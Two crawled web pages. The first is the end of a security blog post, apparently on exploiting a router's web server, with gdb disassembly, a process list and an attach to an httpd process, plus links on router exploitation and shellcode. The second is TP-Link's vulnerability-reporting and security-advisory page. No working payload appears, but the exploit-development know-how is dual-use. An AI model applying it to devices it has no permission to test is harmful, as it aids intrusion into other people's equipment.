(gdb) display/3i $pc
3: x/3i $pc
0x2ab36ce4:     jalr    t9
0x2ab36ce8:     move    a0,s3
0x2ab36cec:     beqz    v0,0x2ab36d2c
0x2ab36cf0:     lw      gp,16(sp)

```

and the process to attach to is the last in the list

```
(gdb) shell ps afx
  PID TTY      STAT   TIME COMMAND
    2 ?        S<     0:00 [kthreadd]
    3 ?        S<     0:00  \_ [migration/0]
 ...
 1126 ttyS0    Ss     0:00 /bin/login --
 1127 ttyS0    S      0:02  \_ -bash
 1142 ttyS0    S+     0:00      \_ bin/sh
22099 ttyS0    S+     0:17          \_ httpd
22100 ttyS0    S+     0:00              \_ httpd
22101 ttyS0    S+     0:00                  \_ httpd
22148 ttyS0    S+     0:00                  \_ httpd
22156 ttyS0    S+     0:00                  \_ httpd
22157 ttyS0    S+     0:00                  \_ httpd
25536 ttyS0    S+     0:00                  \_ httpd
25538 ttyS0    S+     0:00                  \_ httpd
25539 ttyS0    S+     0:00                  \_ httpd
25540 ttyS0    S+     0:00                  \_ httpd
 9958 ttyS0    S+     0:00                  \_ httpd
 9963 ttyS0    S+     0:00                  \_ httpd
 9964 ttyS0    S+     0:02                  \_ httpd
 9965 ttyS0    S+     0:03                  \_ httpd
 9968 ttyS0    S+     0:00                  \_ httpd
 9969 ttyS0    S+     0:00                  \_ httpd
 9971 ttyS0    S+     0:00                  \_ httpd
 9973 ttyS0    S+     0:00                  \_ httpd
(gdb) attach 9973
Attaching to process 9973
warning: process 9973 is a cloned process
Reading symbols from /tl-rootfs/usr/bin/httpd...(no debugging symbols found)...done.
 ...

```
### Links

* [Advanced router exploitation](https://gsec.hitb.org/materials/sg2015/whitepapers/Lyon%20Yang%20-%20Advanced%20SOHO%20Router%20Exploitation.pdf)
* [Why is My Perfectly Good Shellcode Not Working?: Cache Coherency on MIPS and ARM](https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm)

* [Previous post](../../05/cve-2020-9544/ "CVE-2020-9544: DLink DSL-2640B un-authenticated firmware upgrade")
* [Next post](../../../04/29/qed-formulary/ "QED formulary")
## Comments

Please enable JavaScript to view the [comments powered by Disqus.](https://disqus.com/?ref_noscript)

[Comments powered by Disqus](https://disqus.com)

Contents Â© 2024 Gianluca Pacchiella - Powered by [Nikola](https://getnikola.com)



=== Content from www.tp-link.com_9c964bb6_20250119_113732.html ===


Your browser does not support JavaScript. Please turn it on for the best experience.

Click to skip the navigation bar

[Support](/us/support/)

1. [All Support](/us/support/)
2. [Download Center](/us/support/download/)
3. [Support Videos](/us/support/setup-video/)
4. [FAQs](/us/support/faq/)
5. [TP-Link Community](https://community.tp-link.com)
6. [Contact Technical Support](/us/support/contact-technical-support/)

Where to Buy

1. [Online Stores](/us/where-to-buy/#Online Stores)
2. [Distribution Partners](/us/where-to-buy/#Distribution Partners)
3. [Retailers](/us/where-to-buy/#Retailers)
4. [Reseller Partners](/us/where-to-buy/#Reseller Partners)
5. [Solution Partners](/us/where-to-buy/#Solution Partners)

[United States / English](/us/choose-your-location/)

[TP-Link, Reliably Smart](/us/)

[Search](/us/search/)

* Networking
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)
  + [WiFi 7](/us/wifi7/)
  + [Meet WiFi 6E](/us/wifi-6e/)
  + [OneMesh](/us/onemesh/)
  + [AI-Driven Mesh](/us/mesh/ai-driven-mesh/)
  + [VPN](/us/technology/vpn/)

  [Mesh WiFi](/us/whole-home-mesh/)

  Wi-Fi for the whole home

  + [Deco Whole Home WiFi](/us/whole-home-mesh/)
  + [Deco Systems](/us/deco-mesh-wifi/product-family/)

  [Routers](/us/explore/wifi-router/)

  Create a fast and reliable Wi-Fi

  + [WiFi Routers](/us/home-networking/wifi-router/)
  + [WiFi 7 Routers](/us/home-networking/wifi-router/?filterby=6271)
  + [WiFi 6 Routers](/us/home-networking/wifi-router/?filterby=5730)
  + [VPN Routers](/us/home-networking/wifi-router/?filterby=AND%7C6111%7C6112)
  + [Gaming Routers](/us/home-networking/wifi-router/?filterby=5748)

  [Network Expansion](/us/home-networking/all-network-expansion/)

  Easy ways to expand and enhance your network

  + [Range Extenders](/us/home-networking/range-extender/)
  + [Powerline](/us/home-networking/powerline/)
  + [Access Points](/us/home-networking/access-point/)

  [Festa](/us/landing/festa/)

  The Networking Solution Built for Small Businesses and Prosumers

  + [What is Festa?](/us/landing/festa/)
  + [WiFi](/us/business-networking/soho-festa-access-point/)
  + [Switches](/us/business-networking/soho-festa-switch/)
  + [Gateways](/us/business-networking/soho-festa-gateway/)
  + [All Products](/us/business-networking/all-soho-festa/)

  [Accessories](/us/home-networking/all-accessories/)

  Everything else you need for a connected lifestyle

  + [USB Hubs](/us/home-networking/usb-hub/)
  + [USB Converters](/us/home-networking/usb-converter/)
  + [Charging](/us/home-networking/charging/)
  + [Bluetooth Receivers](/us/home-networking/bluetooth-reciever/)

  [Home Office Networking](/us/business-networking/all-soho-switch/)

  The easy-to-use solution for Home Office networking

  + [Unmanaged Switches](/us/business-networking/soho-switch-unmanaged/)
  + [Easy Smart Switches](/us/business-networking/soho-switch-easy-smart/)

  [Adapters](/us/home-networking/all-adapter/)

  Equip your devices for a faster Wi-Fi

  + [PCIe Adapters](/us/home-networking/pci-adapter/)
  + [USB Adapters](/us/home-networking/usb-adapter/)
* Smart Home
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)
  + [Kasa Smart](https://www.kasasmart.com/us)
  + [Tapo Smart](https://www.tapo.com/us/)
  + [Best Solar-Powered Security Cameras 2024](https://www.tapo.com/us/news/429/)
  + [Apple HomeKit](/us/promotion/apple-homekit/)

  [Smart Cameras](/us/home-networking/cloud-camera/)

  Keeping an eye on what matters

  [Smart Plugs](/us/home-networking/smart-plug/)

  Smarten up your home devices

  [Smart Switches](/us/home-networking/smart-switch/)

  More than just on and off

  [Smart Lighting](/us/home-networking/smart-bulb/)

  Light for every occasion

  [Smart Robot Vacuums](/us/smart-home/all-robot-vacuum/)

  Everyday cleaning made easy

  + [Robot Vacuums](/us/smart-home/robot-vacuum/)
  + [Robot Vacuum Accessories](/us/smart-home/robot-vacuum-accessory/)

  [Smart Sensors](/us/smart-home/smart-sensor/)

  Worry-free home automation

  [Smart Hub](/us/home-networking/smart-hub/)

  Seamlessly connect everything

  [New Release](/us/smart-home/new-release/)
* [Business
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)](https://www.omadanetworks.com)

  [Omada](https://www.tp-link.com/us/business-networking/)

  The cloud networking solutions for small and medium business

  + [What is Omada?](/us/omada-sdn/)
  + [Wireless](/us/business-networking/omada/wifi/)
  + [Switches](/us/business-networking/omada/switch/)
  + [Gateways](/us/business-networking/omada/router/)
  + [Controllers](/us/business-networking/omada/controller/)
  + [Accessories](/us/business-networking/omada/accessory/)
  + [All Products](/us/business-networking/all-omada/)

  [Omada Pro](/us/business-networking/all-omada-pro/)

  The intelligent cloud solution for enterprise networking

  + [What is Omada Pro?](/us/landing/omada-pro/)
  + [Wireless](/us/business-networking/all-omada-pro-wifi/)
  + [Switches](/us/business-networking/all-omada-pro-switch/)
  + [Gateways](/us/business-networking/all-omada-pro-router/)
  + [Controllers](/us/business-networking/all-omada-pro-controller/)
  + [All Products](/us/business-networking/all-omada-pro/)

  [Festa](/us/landing/festa/)

  The Networking Solution Built for Small Businesses and Prosumers

  + [What is Festa?](/us/landing/festa/)
  + [WiFi](/us/business-networking/soho-festa-access-point/)
  + [Switches](/us/business-networking/soho-festa-switch/)
  + [Gateways](/us/business-networking/soho-festa-gateway/)
  + [All Products](/us/business-networking/all-soho-festa/)

  [VIGI](https://www.vigi.com/us/)

  The smart surveillance solution for small and medium business

  + [What is VIGI?](https://www.vigi.com/us/vigi/about-vigi/)
  + [Cameras](https://www.vigi.com/us/business-networking/vigi-network-camera/)
  + [Video Recorders](https://www.vigi.com/us/business-networking/vigi-network-video-recorder/)
  + [Software Service](https://www.vigi.com/us/business-networking/vigi-software-service/)
  + [All Products](https://www.vigi.com/us/business-networking/all-vigi-surveillance/)

  [Unmanaged Switches](/us/business-networking/soho-switch-unmanaged/)

  Plug and play for instant connection without management

  + [PoE Switches](/us/business-networking/soho-switch-poe/)
  + [All Unmanaged Switches](/us/business-networking/soho-switch-unmanaged/)

  More Products

  Explore more products you need

  + [Easy Smart Switches](/us/business-networking/soho-switch-easy-smart/)
  + [Accessories](/us/business-networking/soho-accessory/)
  + [Pharos Wireless Bridges](/us/business-networking/all-pharos-wireless-bridge/)
* PROVIDERS
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)
  + [TP-Link Aginet Unified Cloud (TAUC)](https://www.tp-link.com/us/tauc/)
  + [Optical Network](/us/landing/pon/)

  [Whole-Home Mesh](/us/service-provider/home-wifi-system/)

  A seamless, intelligent and easy-to-configure mesh network

  [XGS-PON/GPON](/us/service-provider/gpon/)

  The leading technology for delivering gigabit Internet services
* [Community
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)](https://community.tp-link.com)

  [For Home](https://community.tp-link.com/us/home)

  [For Smart Home](https://community.tp-link.com/us/smart-home)

  [For Business](https://community.tp-link.com/en/business)

  [Brand Ambassador](https://www.tp-link.com/us/brandambassador/)
* [OUR SECURITY
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)](/us/landing/security-commitment/)

[TP-Link, Reliably Smart](/us/)

[Search](/us/search/)
Menu

Submit

* Networking

  Back

  + Mesh WiFi

    - [Deco Whole Home WiFi](/us/whole-home-mesh/)
    - [Deco Systems](/us/deco-mesh-wifi/product-family/)
  + Routers

    - [Recommended Routers](/us/explore/wifi-router/)
    - [WiFi Routers](/us/home-networking/wifi-router/)
    - [WiFi 7 Routers](/us/home-networking/wifi-router/?filterby=6271)
    - [WiFi 6 Routers](/us/home-networking/wifi-router/?filterby=5730)
    - [VPN Routers](/us/home-networking/wifi-router/?filterby=AND%7C6111%7C6112)
    - [Gaming Routers](/us/home-networking/wifi-router/?filterby=5748)
  + Network Expansion

    - [Range Extenders](/us/home-networking/range-extender/)
    - [Powerline](/us/home-networking/powerline/)
    - [Access Points](/us/home-networking/access-point/)
  + Festa

    - [What is Festa?](/us/landing/festa/)
    - [WiFi](/us/business-networking/soho-festa-access-point/)
    - [Switches](/us/business-networking/soho-festa-switch/)
    - [Gateways](/us/business-networking/soho-festa-gateway/)
    - [All Products](/us/business-networking/all-soho-festa/)
  + Accessories

    - [USB Hubs](/us/home-networking/usb-hub/)
    - [USB Converters](/us/home-networking/usb-converter/)
    - [Charging](/us/home-networking/charging/)
    - [Bluetooth Receivers](/us/home-networking/bluetooth-reciever/)
  + Home Office Networking

    - [Unmanaged Switches](/us/business-networking/soho-switch-unmanaged/)
    - [Easy Smart Switches](/us/business-networking/soho-switch-easy-smart/)
  + Adapters

    - [PCIe Adapters](/us/home-networking/pci-adapter/)
    - [USB Adapters](/us/home-networking/usb-adapter/)
  + [WiFi 7](/us/wifi7/)
  + [Meet WiFi 6E](/us/wifi-6e/)
  + [OneMesh](/us/onemesh/)
  + [AI-Driven Mesh](/us/mesh/ai-driven-mesh/)
  + [VPN](/us/technology/vpn/)
* Smart Home

  Back

  + [Smart Cameras](/us/home-networking/cloud-camera/)
  + [Smart Plugs](/us/home-networking/smart-plug/)
  + [Smart Switches](/us/home-networking/smart-switch/)
  + [Smart Lighting](/us/home-networking/smart-bulb/)
  + Smart Robot Vacuums

    - [Robot Vacuums](/us/smart-home/robot-vacuum/)
    - [Robot Vacuum Accessories](/us/smart-home/robot-vacuum-accessory/)
  + [Smart Sensors](/us/smart-home/smart-sensor/)
  + [Smart Hub](/us/home-networking/smart-hub/)
  + [New Release](/us/smart-home/new-release/)
  + [Kasa Smart](https://www.kasasmart.com/us)
  + [Tapo Smart](https://www.tapo.com/us/)
  + [Best Solar-Powered Security Cameras 2024](https://www.tapo.com/us/news/429/)
  + [Apple HomeKit](/us/promotion/apple-homekit/)
* Business

  Back

  + Omada

    - [What is Omada?](/us/omada-sdn/)
    - [Wireless](/us/business-networking/omada/wifi/)
    - [Switches](/us/business-networking/omada/switch/)
    - [Gateways](/us/business-networking/omada/router/)
    - [Controllers](/us/business-networking/omada/controller/)
    - [Accessories](/us/business-networking/omada/accessory/)
    - [All Products](/us/business-networking/all-omada/)
  + Omada Pro

    - [What is Omada Pro?](/us/landing/omada-pro/)
    - [Wireless](/us/business-networking/all-omada-pro-wifi/)
    - [Switches](/us/business-networking/all-omada-pro-switch/)
    - [Gateways](/us/business-networking/all-omada-pro-router/)
    - [Controllers](/us/business-networking/all-omada-pro-controller/)
    - [All Products](/us/business-networking/all-omada-pro/)
  + Festa

    - [What is Festa?](/us/landing/festa/)
    - [WiFi](/us/business-networking/soho-festa-access-point/)
    - [Switches](/us/business-networking/soho-festa-switch/)
    - [Gateways](/us/business-networking/soho-festa-gateway/)
    - [All Products](/us/business-networking/all-soho-festa/)
  + VIGI

    - [What is VIGI?](https://www.vigi.com/us/vigi/about-vigi/)
    - [Cameras](https://www.vigi.com/us/business-networking/vigi-network-camera/)
    - [Video Recorders](https://www.vigi.com/us/business-networking/vigi-network-video-recorder/)
    - [Software Service](https://www.vigi.com/us/business-networking/vigi-software-service/)
    - [All Products](https://www.vigi.com/us/business-networking/all-vigi-surveillance/)
  + Unmanaged Switches

    - [PoE Switches](/us/business-networking/soho-switch-poe/)
    - [All Unmanaged Switches](/us/business-networking/soho-switch-unmanaged/)
  + More Products

    - [Easy Smart Switches](/us/business-networking/soho-switch-easy-smart/)
    - [Accessories](/us/business-networking/soho-accessory/)
    - [Pharos Wireless Bridges](/us/business-networking/all-pharos-wireless-bridge/)
* PROVIDERS

  Back

  + [Whole-Home Mesh](/us/service-provider/home-wifi-system/)
  + [XGS-PON/GPON](/us/service-provider/gpon/)
  + [TP-Link Aginet Unified Cloud (TAUC)](https://www.tp-link.com/us/tauc/)
  + [Optical Network](/us/landing/pon/)
* Support

  Back

  + [All Support](/us/support/)
  + [Download Center](/us/support/download/)
  + [Support Videos](/us/support/setup-video/)
  + [FAQs](/us/support/faq/)
  + [TP-Link Community](https://community.tp-link.com)
  + [Contact Technical Support](/us/support/contact-technical-support/)
  + [Replacement & Warranty](https://www.tp-link.com/us/support/replacement-warranty/)
  + [TP-Link Emulators](/us/support/emulator/)
  + [Compatibility List](/us/support/compatibility-list/)
  + [GPL Code Center](/us/support/gpl-code/)
* Where to Buy

  Back

  + [Online Stores](/us/where-to-buy/#Online Stores)
  + [Distribution Partners](/us/where-to-buy/#Distribution Partners)
  + [Retailers](/us/where-to-buy/#Retailers)
  + [Reseller Partners](/us/where-to-buy/#Reseller Partners)
  + [Solution Partners](/us/where-to-buy/#Solution Partners)
* Community

  Back

  + [For Home](https://community.tp-link.com/us/home)
  + [For Smart Home](https://community.tp-link.com/us/smart-home)
  + [For Business](https://community.tp-link.com/en/business)
  + [Brand Ambassador](https://www.tp-link.com/us/brandambassador/)
* [OUR SECURITY](/us/landing/security-commitment/)

+ [kasa](https://www.kasasmart.com/us)
+ [tapo](https://www.tapo.com/us/)
+ [omada](https://www.omadanetworks.com)
+ [VIGI](https://www.vigi.com/us/)

# TP-Link Product Security Advisory

Protecting our customers from threats to their security is always an important task for TP-Link. As a key player in global Networking and Smart Home markets, we will do our utmost to provide our users with secure stable products and services, and to strictly protect the privacy and security of their data.

We welcome and encourage all reports related to product security or user privacy. We will follow established processes to address them and provide timely feedback.

## Report Vulnerabilities to TP-Link

We strongly encourage organizations and individuals to contact TP-Link’s security team to report any potential security issue.

| Contact way | |
| --- | --- |
| Email address | security@tp-link.com |
| Template | [Potential vulnerability report template](https://static.tp-link.com/document/excel/potential%20vulnerability%20report%20template%20v1.0.xlsx) |
| Hours | TP-Link will endeavor to respond to the report within five working days. |
| PGP Public Key | [Click to download](https://static.tp-link.com/upload/beta/2023/202312/20231214/PublicPGPKey.zip) |

TP-Link will need to obtain detailed information about the reported vulnerability to more accurately and quickly begin the verification process. We strongly recommend submitting a vulnerability report according to the template we provide above.

TP-Link supports encrypted messages using Pretty Good Privacy (PGP)/GNU Privacy Guard (GPG) encryption software.

## Responsible Reporting Guidelines

1. All parties to a vulnerability disclosure should comply with the laws of their country or region.

2. Vulnerability reports should be based on the latest released firmware, and preferably written in English.

3. Report vulnerabilities through the dedicated communication channel. TP-Link may receive reports from other channels but does not guarantee that the report will be acknowledged.

4. Adhere to data protection principles at all times and do not violate the privacy and data security of TP-Link's users, employees, agents, services or systems during the vulnerability discovery process.

5. Maintain communication and cooperation during the disclosure process and avoid disclosing information about the vulnerability prior to the negotiated disclosure date.

6. TP-Link is not currently operating a vulnerability bounty program.

## How TP-Link Deals with Vulnerabilities

* Awareness & Receipt
* ![](https://static.tp-link.com/handling-vulnerability-process-arrow.png)
* Verification
* ![](https://static.tp-link.com/handling-vulnerability-process-arrow.png)
* Remediation
* ![](https://static.tp-link.com/handling-vulnerability-process-arrow.png)
* Notification

TP-Link encourages customers, vendors, independent researchers, security organizations, etc. to proactively report any potential vulnerabilities to the security team. At the same time, TP-Link will proactively obtain information about vulnerabilities in TP-Link products from the community, vulnerability repositories and various security websites. In order to be aware of vulnerabilities as soon as they are discovered.

TP-Link will respond to vulnerability reports as soon as possible, usually within five business days.

TP-Link Security will work with the product team to perform a preliminary analysis and validation of the report to determine the validity, severity and impact of the vulnerability. We may contact you if we need more information about the reported vulnerability.

Once the vulnerability has been identified, we will develop and implement a remediation plan to provide a solution for all affected customers.

Remediation typically takes up to 90 days and in some cases may take longer.

You can keep up to date with our progress and the completion of any remediation activities.

TP-Link will issue a security advisory when one or more of the following conditions are met:

1. The severity of the vulnerability is rated CRITICAL by the TP-Link security team and TP-Link has completed the vulnerability response process and sufficient mitigation solutions are available to assist customers in eliminating all security risks.

2. If the vulnerability has been actively exploited and is likely to increase the security risk to TP-Link customers, or if the vulnerability is likely to increase public concern about the security of TP-Link products, TP-Link will expedite the release of a security bulletin about the vulnerability, which may or may not include a full firmware patch or emergency fix.

Click to submit a security-related inquiry regarding one of our products to TP-Link Technical Support.

[Contact Technical Support](/us/support/contact-technical-support/#E-mail-Support)

### Bulletin

[[4308] Software and Firmware Support on End of Service Products](/us/support/faq/4308/)

[[4061] Statement on Vulnerabilities Noted in Omada System Report](/us/support/faq/4061/)

[[4008] Statement on Remote Command Execution on Archer C5400X(CVE-2024-5035)](/us/support/faq/4008/)

[[3722] Statement on Insecure Local Communication Vulnerabilities in Tapo and Kasa Devices and apps](/us/support/faq/3722/)

[[3643] Official Statement on Archer AX21 Remote Code Execution Vulnerability (CVE-2023-1389)](/us/support/faq/3643/)

[[3348] Statement on Spring Framework RCE Vulnerability( For DPMS)](/us/support/faq/3348/)

[[3347] Statement on Spring Framework RCE Vulnerability(For Omada Software Controller)](/us/support/faq/3347/)

[[3279] Security Advisory for KCodes NetUSB Vulnerabilities](/us/support/faq/3279/)

[[3255] Statement on Apache Log4j2 Vulnerability](/us/support/faq/3255/)

[[2803] Buffer Overflow in pppd Vulnerability](/us/support/faq/2803/)

[[2278] GhostDNS Malware Security](/us/support/faq/2278/)

[[2276] Remote Exploitation Vulnerability](/us/support/faq/2276/)

[[2212] VPNFilter Malware Security](/us/support/faq/2212/)

[[2166] Fix for vulnerabilities of TL-WR740N & TL-WR940N](/us/support/faq/2166/)

[[1970] WPA2 Security (KRACKs) Vulnerability Statement](/us/support/faq/1970/)

[[1963] Notice of Fraudulent and non-TP-Link Affiliated Websites](/us/support/faq/1963/)

[[1859] Fixing the “Directory Traversal” security vulnerability for TL-WA701ND](/us/support/faq/1859/)

[[1595] Addressing vulnerabilities of the M5350](/us/support/faq/1595/)

## Subscribe>TP-Link takes your privacy seriously. For further details on TP-Link's privacy practices, see [TP-Link's Privacy Policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US).

Be The First To Get Exclusive Deals & News

Email Address

Email Error

Subscribe

Consumer Networking and Smart Home

Service Providers Products (Aginet)

Business Networking and Surveillance (Omada and VIGI)

By completing this form you confirm that you understand and agree to our [Privacy Policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US).

reCaptcha not verified

Subscribe

## Let's Connect

* [www.facebook.com](https://www.facebook.com/TPLINKUS/)
* [Instagram](https://www.instagram.com/tplinkus/)
* [www.youtube.com](https://www.youtube.com/user/TPLINKTECH)
* [www.linkedin.com](https://www.linkedin.com/company/tp-link/)
* [twitter.com](https://twitter.com/tplinkus)

[About](/us/about/about-us/)

* [About Us](/us/about/about-us/)
* [Corporate Information](/us/about-us/corporate-information/)
* [Contact Us](/us/about-us/contact/)
* [Careers at TP-Link](/us/about-us/career/)
* [Privacy Policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US)
* [Do Not Sell My Info](/us/about-us/privacy/do-not-sell-my-info/)
* [Accessibility](/us/accessibility/)

[Press](/us/press/news/)

* [News](/us/press/news/)
* [Blog](/us/blog/)
* [Security Advisory](/us/press/security-advisory/)
* [Awards](/us/press/award/)

Partners

* [Partner Program](https://partner.tp-link.com/us/)
* [Partner Deal Registration](https://partner.tp-link.com/us/deal/deal.html)
* [MAP Policy](https://www.tp-link.com/us/map-policy/?type=smb)

Learning Center

* [Technology Trends](/us/learning-center/)
* [Training & Certification](https://training.tp-link.com/)

[Promotions](/us/promotion/)

* [![tp-link](https://static.tp-link.com/upload/menu/tp-link_20231205034128d.png)](https://www.tp-link.com/us/)
* [![kasa](https://static.tp-link.com/upload/menu/kasa_20231205034427x.png)](https://www.kasasmart.com/us)
* [![tapo](https://static.tp-link.com/upload/menu/tapo_20231205034542j.png)](https://www.tapo.com/us/)
* [![omada](https://static.tp-link.com/upload/menu/omada_20231205034833a.png)](https://www.omadanetworks.com)

©2025 TP-Link Systems Inc. and its affiliated companies. All rights reserved.

TP-Link, Tapo, Kasa, Omada, VIGI, Aginet, HomeShield, and Tapo Care branded products are products of TP-Link Systems Inc. or its affiliates.
 Note: Some services and materials may require you to accept additional terms and conditions before access or use.
 References to "TP-Link" may include TP-Link Systems Inc., its subsidiaries, or business units within the TP-Link corporate structure, as applicable.
 The materials provided, including but not limited to press releases, presentations, blog posts, and webcasts, are current as of the date of publication and may be superseded by subsequent updates.

[United States / English](/us/choose-your-location/)

From Ireland?

Get products, events and services for your region.

[GO](https://www.tp-link.com/uk/press/security-advisory/)
[Other Option](https://www.tp-link.com/us/choose-your-location/)

Close

We have updated our Policies. Read [Privacy Policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US) and [Terms of Use](https://privacy.tp-link.com/web/official/terms-of-use?region=US) here.
 This website uses cookies to improve website navigation, analyze online activities and have the best possible user experience on our website. You can object to the use of cookies at any time. You can find more information in our  [privacy policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US) .

Cookie Settings
Accept All Cookies

We have updated our Policies. Read [Privacy Policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US) and [Terms of Use](https://privacy.tp-link.com/web/official/terms-of-use?region=US) here.
 This website uses cookies to improve website navigation, analyze online activities and have the best possible user experience on our website. You can object to the use of cookies at any time. You can find more information in our  [privacy policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US) .

Basic Cookies

These cookies are necessary for the website to function and cannot be deactivated in your systems.

TP-Link

accepted\_local\_switcher, tp\_privacy\_base, tp\_privacy\_marketing, tp\_smb-select-product\_scence, tp\_smb-select-product\_scenceSimple, tp\_smb-select-product\_userChoice, tp\_smb-select-product\_userChoiceSimple, tp\_smb-select-product\_userInfo, tp\_smb-select-product\_userInfoSimple, tp\_top-banner, tp\_popup-bottom, tp\_popup-center, tp\_popup-right-middle, tp\_popup-right-bottom, tp\_productCategoryType

Livechat

\_\_livechat, \_\_lc2\_cid, \_\_lc2\_cst, \_\_lc\_cid, \_\_lc\_cst, CASID

Youtube

id, VISITOR\_INFO1\_LIVE, LOGIN\_INFO, SIDCC, SAPISID, APISID, SSID, SID, YSC, \_\_Secure-1PSID, \_\_Secure-1PAPISID, \_\_Secure-1PSIDCC, \_\_Secure-3PSID, \_\_Secure-3PAPISID, \_\_Secure-3PSIDCC, 1P\_JAR, AEC, NID, OTZ

Analysis and Marketing Cookies

Analysis cookies enable us to analyze your activities on our website in order to improve and adapt the functionality of our website.

The marketing cookies can be set through our website by our advertising partners in order to create a profile of your interests and to show you relevant advertisements on other websites.

Google Analytics & Google Tag Manager

\_gid, \_ga\_<container-id>, \_ga, \_gat\_gtag\_<container-id>

Google Ads & DoubleClick

test\_cookie, \_gcl\_au

Meta Pixel

\_fbp

Crazy Egg

cebsp\_, \_ce.s, \_ce.clock\_data, \_ce.clock\_event, cebs

Linkedin

lidc, AnalyticsSyncHistory, UserMatchHistory, bcookie, li\_sugr, ln\_or

Accept All Cookies
Save Settings


